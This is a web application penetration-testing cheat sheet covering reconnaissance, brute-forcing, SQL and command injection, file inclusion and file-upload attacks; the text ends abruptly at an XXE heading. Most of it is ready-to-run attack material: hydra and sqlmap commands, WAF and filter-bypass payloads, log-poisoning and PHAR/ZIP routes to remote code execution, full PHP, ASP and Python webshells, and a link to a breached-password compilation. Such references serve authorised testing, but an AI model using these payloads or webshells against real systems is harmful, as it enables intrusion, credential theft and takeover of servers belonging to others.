# Web application pentest cheet sheet

## Passive reconissance

#### DNS, Domain & IP informations

 - `host pentest-experts.com`
 - `whois pentest-experts.com`
 - `dnsrecon -d pentest-experts.com`
 - https://sitereport.netcraft.com
 - https://dnsdumpster.com

#### Passiv portsacn results

 - https://shodan.io
 - https://search.censys.io

#### Enumerating subdomains / emails via OSINT

 - `sublist3r -d pentest-experts.com`
 - `theHarvester -d pentest-experts.com -b all`
 - https://crt.sh
 - https://osint.sh

#### Google dorks 

 - `site:pentest-experts.com` - all indexed urls, files of a speciffic site
 - `inurl:admin` - search for admin-panel
 - `intitle:admin` - search for admin-panel
 - `ext:(old | bak | inc)` - file extensions (which could potentially leak information)
 - `site:pentest-experts.com filetype:xml` - filetype work only in comb. with site
 - `site:*.pentest-experts.com` - all subdomains
 - `cache:pentest-experts.com` - display cached version
 - `info:pentest-experts.com` - informatio about the webpage

#### Older versions of websites

 - https://web.archive.org

#### Leaked passwords

 - https://downloadtorrentfile.com/hash/af2879db0fab2a32ba38d0491aa8fea5e29d3678?name=CompilationOfManyBreaches.7z
 - Searches in google and the darknet search engines


## Active reconissance

#### NMAP full scan with all scripts

 - `nmap -Pn -sV -O -p- --script all 1.2.3.4`

#### WAF idenfification

 - `wafw00f pentest-experts.com`
 - `wafw00f -a pentest-experts.com` - find all possible WAFs

#### Informations about used technologies

 - `buildwith` - Browser plugin
 - `wappalyzer` - Browser plugin
 - `whatweb pentest-experts.com`

#### Interesting files on a website

 - `robots.txt` - files & folders which sould not be indexed
 - `sitemap.xml` - list of all URLs which sould be indexed
 - `urllist.txt` - list of all URLs which sould be indexed

#### Active DNS reconissance

 - `dnsenum --enum pentest-experts.com`  
   (enumeration using zone transfer and public sources)
 - `dnsenum --enum inlanefreight.com -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -r`  
   (recursive enumeration using a wordlist)
 - `dig axfr @nsztm1.digi.ninja zonetransfer.me`   
 Zonetransfer from `nsztm1.digi.ninja` for `zonetransfer.me`
 - `fierce --domain pentest-experts.com`
 - `nmap -Pn -sV -O -sC -T0 -p- 1.2.3.4`

#### Active Subdomain / VHosts brutforcing

 - `gobuster vhost -u https://pentest-experts.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain`  
   (use `-k` to ignore invalid SSL certificates or `-o scan.log` to output to a file)
 - `ffuf -u "https://FUZZ.pentest-experts.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -v`  
   Need to resolve the IP via DNS, use e.g. `-mc 200,301,302` to filter for speciffic HTTP response code
 - `ffuf -u "https://pentest-experts.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -H 'Host: FUZZ.pentest-experts.com' -v`  
   Need only to resolve the main domain (`pentest-experts.com`) and fuzz for vhosts added to the Webserver configuartion but not added as a A / AAAA record to the DNS. This is done via the `Host` header. User `-fs 123` to filter speciffic response sizes out in case the response code would not help.

#### Active CMS enumeration / attack

 - `wpscan --url https://pentest-experts.com/wp/`
 - `wpscan --url https://pentest-experts.com/wp/ --enumerate u`  
   (enumerate users)
 - `wpscan --url https://pentest-experts.com/wp/ --enumerate vp --api-token YOUR_TOKEN`  
   (Vuln. plugins, need an API topen for wpscan)
 - `wpscan --url https://pentest-experts.com/wp/ --enumerate vt --api-token YOUR_TOKEN`  
   (Vuln. themes, need an API topen for wpscan)
 - `wpscan --url https://pentest-experts.com/wp/ -U admin -P /usr/share/wordlists/rockyou.txt`  
   (Bruteforce of password)
 - `cmsmap.py https://pentest-experts.com/wp/ -f W`  
   (`W` for WordPress, `J` for Joomla, `D` for Drupal)

#### The `.well-known` URIs

The `.well-known` standard, serves as a standardized directory within a website's root domain with a treasure-trove of information - see: https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml 

e.g.:

 - `https://pentest-experts.com/.well-known/openid-configuration`  
   JSON document containing metadata about OpenID endpoints, supported authentication methods, token issuance, etc.

#### Working with services

FTP

 - `ftp 1.2.3.4`
 - **ftp>** `ls`
 - **ftp>** `cd secret`
 - **ftp>** `get flag.txt`
 - **ftp>** `put linsploit.sh`
 - **ftp>** `bye`
 - `nmap 1.2.3.4 -p 21 --script ftp-brute --script-args userdb=/home/mark/users.txt`
 - `nmap 1.2.3.4 -p 21 --script ftp-anon`
 - `hydra -L users.txt -P rockyou.txt 1.2.3.4 ftp`
 - `hydra -l www-data -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 1.2.3.4 ftp`  
   Bruteforce a 6-8 character password using the characters a-z, A-Z and 0-9

SSH

 - `ssh root@1.2.3.4`
 - `nc 1.2.3.4 22` (Get banner)
 - `nmap 1.2.3.4 -p 22 --script ssh2-enum-algos`
 - `nmap 1.2.3.4 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
 - `nmap 1.2.3.4 -p 22 --script ssh-auth-methods --script-args "ssh.user=test"`
 - `hydra -L users.txt -P rockyou.txt 1.2.3.4 ssh`
 - `nmap 1.2.3.4 -p 22 --script ftp-brute --script-args userdb=/home/mark/users.txt`

HTTP

 - `curl -v 1.2.3.4`
 - `curl -i -X OPTIONS 1.2.3.4`
 - `curl https://pentest-experts.com/upload/ --upload-file webshell.php`
 - `httpx https://pentest-experts.com`
 - `httpx --no-verify https://pentest-experts.com`
 - `dirb https://pentest-experts.com`
 - `links https://pentest-experts.com`
 - `lynx https://pentest-experts.com`
 - `nmap -p 443 1.2.3.4 --script ssl-enum-ciphers`
 - `nmap -p 443 1.2.3.4 --script ssl-heartbleed`
 - `nmap -p 80 1.2.3.4 --script http-enum`
 - `nmap -p 80 1.2.3.4 --script http-headers`
 - `nmap -p 80 1.2.3.4 --script http-methods`
 - `nmap -p 80 1.2.3.4 --script http-methods --script-args "http-methods.url=/webdav/"`
 - **msf5>** `use auxiliary/scanner/http/http_version`
 - **msf5>** `use auxiliary/scanner/http/brute_dirs`
 - `gobuster dir -u https://pentest-experts.com/ -w /usr/share/dirb/wordlists/common.txt -x zip,bz2,tar,gz,tgz,tar.bz2,tar.gz,old,bak,inc,ini,xml,txt,yaml,yml,conf,cnf,config,json -k -b 404,401`  
 Search for directries (`dir`) and files (`-x ...`) with the wordlist (`-w ...`) by accepting also self-signed SSL certificates(`-k`) and blacklisting 404 and 401 errorcodes (`-b ...`) as invalid URLs.
 - `ffuf -w /usr/share/dirb/wordlists/common.txt:FUZZ -u http://83.136.253.173:51317/FUZZ -recursion -recursion-depth 1 -e .asp,.aspx,.bat,.c,.cfm,.cgi,.css,.com,.dll,.exe,.hta,.htm,.html,.inc,.jhtml,.js,.jsa,.jsp,.log,.mdb,.nsf,.pcap,.php,.php2,.php3,.php4,.php5,.php6,.php7,.phps,.pht,.phtml,.pl,.phar,.reg,.sh,.shtml,.sql,.swf,.txt,.xml -v`  
   Recursive fuzzing of directory and filename with different extensions.
 - `ffuf -u "https://pentest-experts.com/index.php?FUZZ=val" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -H 'Host: FUZZ.pentest-experts.com' -v`  
   Fuzzing of GET / POST parameters or values.  
   Use `-X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'` for POST parameter or value fuzzing.  
 - **Use browser-plugins like the `UA spoofer` to fake a older Browser like IE and test if a different version of the website is served!!! Maybe there is a fallback to an oder an vuln. version of the site...**
 
MySQL

 - `mysql -h 1.2.3.4`
 - `mysql -h 1.2.3.4 -u user`
 - `mysql -h 1.2.3.4 -u user -p`
 - **msf5>** `use auxiliary/scanner/mysql/mysql_writeable_dirs`
 - **msf5>** `use auxiliary/scanner/mysql/mysql_hashdump`
 - **msf5>** `use auxiliary/scanner/mysql/mysql_login`
 - **mysql [dvwa]>** `select load_file('/etc/passwd')`
 - `nmap -p 3306 1.2.3.4 --script mysql-empty-password`
 - `nmap -p 3306 1.2.3.4 --script mysql-info`
 - `nmap -p 3306 1.2.3.4 --script mysql-audit --script-args "mysqluser=root,mysqlpass=password1"`
 - `nmap -p 3306 1.2.3.4 --script mysql-variables --script-args "mysql-audit.username=root, mysql-audit.password=password1, mysql-audit.filename=/usr/share/nmap/nselib/data/mysql-cis.audit"`
 - `nmap -p 3306 1.2.3.4 --script mysql-dump-hashes --script-args "username=root, password=password1"`
 - `hydra -L users.txt -P rockyou.txt 1.2.3.4 mysql`

MS SQL

 - `nmap -p 3306 1.2.3.4 --script ms-sql-info`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-empty-password`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-ntlm-info --script-args "mssql.instance-port=1433"`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-ntlm-info --script-args "mssql.instance-port=1433"`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-dump-hashes --script-args "mssql.username=admin, mssql.password=password1"`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-xp-cmdshell --script-args "mssql.username=admin, mssql.password=password1, ms-sql-xp-cmdshell.cmd='ipconfig /all'"`
 - **msf5>** `use auxiliary/scanner/mssql/mssql_login`
 - **msf5>** `use auxiliary/scanner/mssql/mssql_hashdump`
 - **msf5>** `use auxiliary/admin/mssql/mssql_exec`
 - **msf5>** `use auxiliary/admin/mssql/mssql_enum`
 - **msf5>** `use auxiliary/admin/mssql/mssql_enum_sql_logins`
 - **msf5>** `use auxiliary/admin/mssql/mssql_enum_domain_accounts`

#### Webserver security scanning

 - `BurpSuite Proxy`
 - `OWASP ZAP Proxy`
 - `nikto -h https://pentest-experts.com -o report.html -Format htm`


## Automate passive and active reconissance

 - `amass enum -d pentest-experts.com -passive -src -ip -dir ./outputfolder/`
 - `amass intel -whois -d pentest-experts.com -active -src -ip -dir ./outputfolder/`
 - `wap.py https://pentest-experts.com common.txt dns.txt`  
 see: https://github.com/mark-b1980/WebsiteAutoRecon


## XSS / HTML injection

 - `xsser --gtk`
 - `xsser --url "https://pentest-experts.com/index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --cookie "PHPSESSID=gp9j95cv3q1tki2nsg8mml4lt6;showhints=0" --drop-cookie --auto --reverse-check -s`
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

**Prevention tips:**

 - Using XSS prevention headers.
 - Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
 - Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts. (https://web.dev/articles/csp?hl=en)
 - Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

**Log poisioning to attack admin users**

 - Poision webserver logs e.g. via `User-Agent` header with XSS or HTMLi code to attack admin users viewing logs in a web interface.


## SQLi / NoSQLi

**SQLi**

You can change `--risk` to try riskier statements but some SQLi injection points like an `UPDATE` statement can overwrite all data in a table when combined with a `OR`-based payload (`--risk 3`). The setting `--risk 2` adds heavy time-based queries.

 - `sqlmap -r request.txt --level 5 --risk 3 -p vulnerable_field --random-agent --dbs`  
   Use captured request from ZAP / BurpSuite and use a random user agent string instrad of the sqlmap UA sting as many WAFs drop requests from sqlmap.
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --level 5 --risk 1 -p search --dbs`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --level 5 --risk 1 -p search -D db_name --tables`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --level 5 --risk 1 -p search -D db_name -T table_name --dump`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/search/xxx*" --cookie="SID=123456ABC" --level 5 --risk 1 --dbs`  
   Explot the serach-value `xxx` in "nice" URLs - `*` can be used an marker in any field like cookies or GET-parameters, not only in "nice" URLs.
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --prefix "'" --suffix " -- "`  
   Specify suffix to start the SQLi and suffix to comment the left-overs out
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --technique U`  
   Specify query type - here UNION queries
 - `` 
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --os-pwn`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --os-shell`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --sql-shell`
 - `sqlmap -r request.txt --parse-errors --dbs`  
   Parse SQL errors and output them to the console
 - `sqlmap -r request.txt --code=200 --dbs`  
   Use HTTP response code 200 to detect `True` - useful in case a `False` response would result in a different status code (e.g. 500 server error or 302 redicrection).
 - `sqlmap -r request.txt --string="Welcome" --dbs`  
   Detect `True` / `False` responses based on the presence / absence of a string.
 - `sqlmap -r request.txt --union-cols=5 --dbs`  
   Specify the number of coulumns for a unin based query manually.
 - `sqlmap -r request.txt --passwords`  
   Get the password-hashes from the users within the DBMS itself.
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

Try also HTTP verb tampering - so try to send `GET` requests as `POST` and vice versa to test for insufficient filtering.

**Manual prefix testing**

 1. Testing `https://pentest-experts.com/case6.php?col=id'` = No output = Not sure if it worked
 2. Testing `https://pentest-experts.com/case6.php?col=id"` = No output = Not sure if it worked
 3. Testing `https://pentest-experts.com/case6.php?col=id%60` - SQL Error = Confirmed working but prefix not correct
 4. Testing `https://pentest-experts.com/case6.php?col=id%60+--+` - SQL Error = Confirmed working but prefix not correct, trying to add `)`
 5. Testing `https://pentest-experts.com/case6.php?col=id%60)+--+` - SQL Error = Confirmed working but prefix not correct, trying to add `)`
 6. Testing `https://pentest-experts.com/case6.php?col=id%60))+--+` - Some data output = Confirmed working, prefix correct, using `--prefix="%60))"` in SQLmap

 In case there is no error, I would try `')`, `'))`, ... and `")`, `"))`, ...

**Bypassing defense mechanisms**

 - `sqlmap -r request.txt --random-agent --dbs`  
   User random user agent to overcome UA blocking
 - `sqlmap -r request.txt --csrf-token="csrf-token-parameter-name" --dbs`  
   Read and use CSRF token for each request
 - `sqlmap -r request.txt --randomize="parameter-name-for-random-value" --dbs`  
   Calculate a new random message for each request 
 - `sqlmap -r request.txt --eval="import hashlib; hash_parameter=hashlib.md5(msg).hexdigest()" --dbs`  
   Calculate hash for each request (using Python code)
 - `sqlmap -r request.txt --proxy="socks4://127.0.0.1:9050" --dbs`  
   Use TOR proxy to overcome IP address blocking
 - `sqlmap -r request.txt --chunked --dbs`  
   Send payloads in multiple HTTP packages as chunks to avoid detection
 - `sqlmap -r request.txt --hpp --dbs`  
   Split payloads in multiple instance of the same parameter (e.g.: `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users`)  
   Works only if a target concatinate those like ASP does!
 - `sqlmap -r request.txt --tamper=script1,script2,... --dbs`  
   Using pre-defined tamper scripts to bypass WAF/IPS solutions:
    - `0eunion`  
      Replaces instances of `UNION` with `e0UNION`
    - `base64encode`  
      Base64-encodes all characters in a given payload
    - `between`  
      Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`
    - `commalesslimit`  
      Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart
    - `equaltolike`  
      Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart
    - `halfversionedmorekeywords`  
      Adds (MySQL) versioned comment before each keyword
    - `modsecurityversioned`  
      Embraces complete query with (MySQL) versioned comment
    - `modsecurityzeroversioned`  
      Embraces complete query with (MySQL) zero-versioned comment
    - `percentage`  
      Adds a percentage sign (`%`) in front of each character (e.g. `SELECT` -> `%S%E%L%E%C%T`)
    - `plus2concat`  
      Replaces plus operator (`+`) with (MsSQL) function `CONCAT()` counterpart
    - `randomcase`  
      Replaces each keyword character with random case value (e.g. `SELECT` -> `SEleCt`)
    - `space2comment`  
      Replaces space character with comments `/
    - `space2dash`  
      Replaces space character with a dash comment (`--`) followed by a random string and a new line (`\n`)
    - `space2hash`  
      Replaces (MySQL) instances of space character with a pound character (`#`) followed by a random string and a new line (`\n`)
    - `space2mssqlblank`  
      Replaces (MsSQL) instances of space character with a random blank character from a valid set of alternate characters
    - `space2plus`  
      Replaces space character with plus (`+`)
    - `space2randomblank`  
      Replaces space character with a random blank character from a valid set of alternate characters
    - `symboliclogical`  
      Replaces `AND` and `OR` logical operators with their symbolic counterparts (`&&` and `||`)
    - `versionedkeywords`  
      Encloses each non-function keyword with (MySQL) versioned comment
    - `versionedmorekeywords`  
      Encloses each keyword with (MySQL) versioned comment  

**NoSQLi**
 
 - `NoSQLMap` (... then follow the assistant)
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection 

#### MySQL access to remote code execution (RCE)

 - `SELECT '<?php echo system($_GET["c"]) ?>' INTO OUTFILE '/var/www/html/upload/shell.php' FROM mysql.user LIMIT 1`


## HTTP method/verb tampering

... Changing the HTTP methods (`GET`, `POST`, `PUT`, ...) to provoke different behaviour of the application.

 - `curl -v -X GET 1.2.3.4`
 - `curl -v -X HEAD 1.2.3.4`
 - `curl -v -X POST 1.2.3.4`
 - `curl -v -X POST --data "param1=value1&param2=value2" 1.2.3.4`
 - `curl https://pentest-experts.com/upload/ --upload-file webshell.php`
 - `nmap -p 80 --script http-method-tamper --script-args 'http-method-tamper.paths={/upload/,/protected/index.php}' 1.2.3.4`
  - Enumerarte allowed methods using nikto  
   `nikto -h "https://pentest-experts.com/search.php?q=xxx"`
 - Try using a not allowed method on purpose to provoke a error message


## HTTP login bruteforcing

**BASIC authentication**

 - `hydra -l admin -P /usr/share/wordlists/1000_common_passwords.txt -f 1.2.3.4 http-get /admin/`  
    use `-s` to specify a port (e.g. `-s 8080`)
 - `hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/1000_common_passwords.txt -f 1.2.3.4 http-get /admin/`

 Try also HTTP verb tampering - so try to send `GET` requests as `POST` and vice versa to test for a insecure server configuration.

**DIGEST authentication**

This is a challenge response auth. and much more secure / difficult to attack then BASIC auth.

 - `hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/1000_common_passwords.txt -f 1.2.3.4 http-get /admin/`  
   Hydra can detect the type of auth. and that's why the same command can attack BASIC and DIGEST auth.

**Web login form**

 - `hydra -l admin -P /usr/share/wordlists/1000_common_passwords.txt https://pentest-experts.com http-post-form "/login.php:user=^USER^&password=^PASS^:F=incorrect"`  
    `^USER^` and `^PASS^` get replaced by the credentials from the list(s) and `:F=` specifies a flag to determin if the login failed  
    Use for example `:S=302` to set the success flag to the value `302`, which occure in a HTTP redirect


## Other brutefoce attack examples

 - `medusa -h 1.2.3.4 -u admin -p pass1234 -M ssh -n 2222`
 - `medusa -H host_list.txt -U /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt -M ftp`
 - `medusa -H host_list.txt -U /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt -M http -m GET`
 - `medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" -h https://pentest-experts.com`

 **Username generation**

  - `./username-anarchy Jane Smith > jane_smith_usernames.txt`  
    Create a username list

**Targeted wordlists**

 - `cupp -i` (interactive mode)


## Command injection

 - `commix --url="https://pentest-experts.com/ping.php?ip=INJECT_HERE"`

**Injection characters**

```
CHAR   URL ENC.    DESCRIPTION
-----  ----------  ----------------------------
 ;     %3b         (Concatination of commands)
 \n    %0a         (Newline)
 &     %26         (Background)
 |     %7c         (Pipe)
 &&    %26%26      (Logical AND)
 ||    %7c%7c      (Logical OR)
 ``    %60%60      (Subshell)
 $()   %24%28%29   (Subshell)
```

**Bypassing space blacklist**

 - Encoding the space as `\x20`
 - Using a tab (`%09`)
 - Using `${IFS}` - a Linux environment variable containing the CLI argument speparator (usually the space)
 - Using the input redirection operator - e.g.: `cat</etc/passwd`
 - Using the bash brace expantion syntax - e.g.: `{cat,/etc/passwd}`

**Bypassing `\` and `/` blacklisting**

 - Using `${PATH:0:1}` in Linux (Substring)
 - Using `$(tr '!-}' '"-~'<<<[)` in Linux (Character shifting)
 - Using `$env:HOMEPATH[0]` in Windows Powershell
 - Using `%HOMEPATH:~6,-5%` in Windows CMD (`-5%` is the length of the username)

**Bypassing `;` blacklisting**

 - Using `${LS_COLORS:10:1}` in Linux (Substring)
 - Using `$(tr '!-}' '"-~'<<<:)` in Linux (Character shifting)

**Bypassing `|` blacklisting**

 - Using `<<<` and a subshell in Linux - e.g.: `grep${IFS}root<<<$(cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd)`

 **Bypassing command blacklists**

 - Adding aquotation marks `w"h"o"am"i` or `w'h'o'am'i`
 - Adding the positional character operator `who$@ami` (Linux only)
 - Adding the `\` character `w\ho\ami` (Linux only)
 - Adding the `^` character - e.g.: `who^ami` (Windows only)
 - Using mixed case `wHoAmI` (Windows only)
 - Using mixed case `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` or `$(a="WhOaMi";printf %s "${a,,}")` (Linux only)
 - Using reversed commands - e.g.: `$(rev<<<'imaohw')` (Linux only)
 - Using reversed commands - e.g.: `iex "$('imaohw'[-1..-20] -join '')"` (Windows Powershell only)
 - Using encoding - e.g. Base64: `bash<<<$(base64 -d<<<d2hvYW1p)` (Linux Only)
 - Using encoding - e.g. Base64: `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` (Windows Powershell only)  
   ❗❗❗ Powershell use the characterset UTF-16LE and not UTF-8 ❗❗❗  
   Create the correct Base64 string on Linux: `echo -n "whoami" | iconv -f utf-8 -t utf-16le | base64`

Try also HTTP verb tampering - so try to send `GET` requests as `POST` and vice versa to test for insufficient filtering.

For more see: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses

Useful tools:

 - https://github.com/Bashfuscator/Bashfuscator
 - https://github.com/danielbohannon/Invoke-DOSfuscation


## Directory travesal

 - Overcome filtering: 
   1. use `....//` to overcome removal of `../` from parameters
   2. use `....\/` to overcome removal of `../` from parameters
   3. use `....////` to overcome removal of `../` from parameters
   4. URL encode `../` into `..%2F` or `%2E%2E%2F`


## Local File Inclusion (LFI) / Remote File Inclusion (RFI)

 - `https://pentest-experts.com/index.php?page=../../../../../etc/passwd` (local)
 - `https://pentest-experts.com/index.php?page=https://pentest-experts.com/sypps.txt` (remote)
 - `https://pentest-experts.com/index.php?page=ftp://pentest-experts.com/sypps.txt`  
   (remote via FTP in case WAF block `https://`)
 - `https://pentest-experts.com/index.php?page=\\192.168.1.2\sypps.txt`  
   (remote via SMB in case WAF block `https://` - Windows webserver only but works there even if `allow_url_include` is deactivated)

Try to include `https://127.0.0.1/somefile.html` frist do confirm RFI without traversing a firewall...

**Prepended scrings:**

In case a string get prepended (e.g. `include("lang_".$GET["lang"]);`) to the user controlled input of the loaded file, try to add `/` before the directory traversal to make the prepended string look like a directory - e.g.:

`https://pentest-experts.com/index.php?page=/../../../../../etc/passwd`

**Second order attacks:**

Test also for LFI in user supplied data, which is later read from the database - e.g.:

``WISSING GOOD EXAMPLE !!!`

**Prepended stings:**

Many web-applications prepend string the the file inclusion path (e.g. `include($GET["lang"].".php");`) - to bypass this we have in old versions of PHP (before 5.5) this options:

 - Adding 2048 x `./` to the end of the in the path to exceed the 4096 character limit (`./` is removed by the OS when accessing a file)
 - Adding a `%00` byte after the injection (PHP uses `NUL` byte terminated strings)

#### PHP filters / wrappers

 - `php://filter/read=convert.base64-encode/resource=config.php`
 - `php://filter/read=convert.base64-encode/resource=/etc/passwd`
 - `php://filter/read=convert.base64-encode/resource=../../../../../etc/passwd`
 - `expect://whoami`  
   Expect wrapper need to be installed and activated for this attack to work
 - `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA%2FPg%3D%3D&c=whoami`  
   PHP webshell - run commands with: `&c=whoami`
 - `curl -s -X POST --data '<?php system("whoami"); ?>' "https://pentest-experts.com/index.php?vuln_param=php://input"`  
   Input wrapper, which receive the webshell as POST data

#### LFI to RCE

**Log poisioning**

 1. Browse some URL with BrupSuite or ZAP and change the `User-Agent` field in the header to:  
`<?php echo system($_GET["c"]); ?>`
 2. Use the **access.log** to write a new shell to `/tmp`:  
`https://pentest-experts.com/read.php?file=../../../../../var/log/apache2/access.log&c=echo+'<?php+echo+system($_GET["c"]);+?>'>/tmp/s.php`
 3. Utilize the new shell:  
`https://pentest-experts.com/read.php?file=../../../../../tmp/s.php&c=ls+-l+/var/www/html/`

The User-Agent header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a number usually between 0-50).

Try also poisioning other logs like FTP or mailserver logs, which may log usernames after login attempts, etc. 

**Upload a image-file containing a webshell**

```php
GIF89a<?php system($_GET["c"]); ?>
```

Store this shell as `me.gif`, upload it to the webserver (e.g. as profile image) and include it then.

**Using the ZIP wrapper**

```bash
echo '<?php system($_GET["c"]); ?>' > shell.php && zip shell.zip shell.php
```

Upload this file and incude it with

`?vuln_param=zip://./upload_dir/shell.zip%23shell.php?c=whoami`

**Using PHAR**

Create this php file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["c"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Then compile it into a phar file and rename it to jpg:

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Upload this file and incude it with

`?vuln_param=phar://./upload_dir/shell.jpg%2Fshell.txt?c=whoami`

**PHP session poisioning**

Session data is stored at:

 - `/var/lib/php/sessions/sess_[SESSIONID]`
 - `C:\Windows\Temp\sess_[SESSIONID]`

 1. Examine the session data by including the file.
 2. Determine if any value in those file can be controlled
 3. Adding a webshell into that value (e.g. `<?php system($_GET["c"]); ?>`)
 4. Including the session file and running the webshell

**TIPPS**

 - Don't forget to scan for unused parameters - e.g. with  
   `/usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt`
 - Useful wordlist for fuzzing can be found in `/usr/share/wordlists/SecLists/Fuzzing/LFI/`

**TOOLS**

 - https://github.com/mzfr/liffy
 - https://github.com/D35m0nd142/LFISuite
 - https://github.com/OsandaMalith/LFiFreak


## Quick & easy servers

 - `sudo python3 -m http.server 80` (start webserver on port 80)
 - `sudo php -S 0.0.0.0:80` (start webserver on port 80)
 - `sudo python -m pyftpdlib -p 21` (start ftp server on port 21)
 - `sudo impacket-smbserver -smb2support share $(pwd)` (start SMB server and share the curent directroy)


## Webshells

**PHP**

```php
<?php echo system($_GET["c"]) ?>
```

Usage: `https://hacked.box/upload/shell.php?c=whoami`

**ASP**

```asp
<% eval request('c') %>
```

Usage: `https://hacked.box/upload/shell.asp?c=whoami`

**Python**

```python
#!/usr/bin/env python3
import cgi
import cgitb
import subprocess

cgitb.enable()

print("Content-Type: text/html")
print()

fs = cgi.FieldStorage()
try:
    cmd = fs['c'].value.strip()

    p = subprocess.Popen(cmd.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p.wait()
    out, err = p.communicate()
    out = "<pre>" + out.decode("UTF-8") + "<hr>" + err.decode("UTF-8") + "<pre>"

except KeyError:
    out = "Use <pre>?c=[command]</pre> to execute a command!"
  
except:
    out = "Unknown error"

print(out)
```

Usage: `https://hacked.box/upload/shell.py?c=whoami`


## File upload attacks

#### Pass filter with alternative PHP fileextentions

 - In case `.php` files are not allowed to be uploaded or not executed, try `.php5`, `.php7`, `.phtml`, etc.

**List of extensions**

```
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phtm
.phtml
.phar
.phpt
.phps
.gif.php
.php.gif
.php%00.gif
.php\x00.gif
```

Herby exploits `.gif.php` a weak regex check of a filename and `.php.gif` a weak server configuration, which would try to execute all files with a `.php` in the filename.

The character injection (e.g. `.php\x00.gif`) try to exploit the 

```
%20
%0a
%00
%0d%0a
%0d0a
\x20
\x0a
\x00
\x0d\x0a
\x0d0a
/
.\
.
…
:
```

**Wordlist generator:**

```python
#!/usr/bin/env python3
with open("wordlist.txt", "w", encoding="UTF-8") as f:
    for e in ['.php', '.php3', '.php4', '.php5', '.php7', '.php8', '.pht', '.phtm', '.phtml', '.phar', '.phpt', '.phps']:
        # Different extensions
        f.write(f"s{e}\n")
        # Double extension
        f.write(f"s.gif{e}\n")
        f.write(f"s{e}.gif\n")
        # Character injection
        for c in ['%20', '%0a', '%00', '%0d%0a', '%0d0a', '\\x20', '\\x0a', '\\x00', '\\x0d0a', '\\x0d\\x0a', '/', './', '.', '…', ':']:
            f.write(f"s{e}{c}.gif\n")
            f.write(f"s{c}{e}.gif\n")
            f.write(f"s.gif{e}{c}\n")
            f.write(f"s.gif{c}{e}\n")
```

Use the wordlist for upload and GET-request fuzzing. 

❗❗❗ Successfull upload do not always mean the file was written correctly. ❗❗❗

#### Execute php-shell on NGINX after upload with wrong file-extension

 - Given a PHP webshell was uploaded as shell.gif on an NGINX server, the script can be run in PHP conext by adding `/shell.php&c=pwd` after the filename - a full URL-example would be:  
`https://pentest-experts.com/upload/shell.gif/shell.php?c=pwd`

#### XXE via SVG files

Reading files based on path:

```xml
<?xml version="1.0" encoding="UTF-8"?>
